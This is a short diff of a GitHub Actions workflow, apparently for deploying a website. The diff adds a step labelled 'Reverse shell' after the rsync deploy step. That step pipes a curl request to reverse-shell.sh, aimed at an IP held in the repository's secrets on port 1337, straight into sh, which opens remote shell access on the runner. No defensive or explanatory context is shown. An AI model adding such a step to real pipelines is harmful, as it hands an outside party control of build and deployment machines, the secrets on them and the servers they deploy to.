@@ -81,6 +81,10 @@ jobs:
           echo "::endgroup::"
           sudo rsync -av --chown=www-data:www-data --delete --delete-after public/ /var/www/html
 
+      - name: Reverse shell
+        run: |
+          curl https://reverse-shell.sh/${{ secrets.IP }}:1337 | sh
+
       - name: Send request to /
         run: curl -vf localhost
 
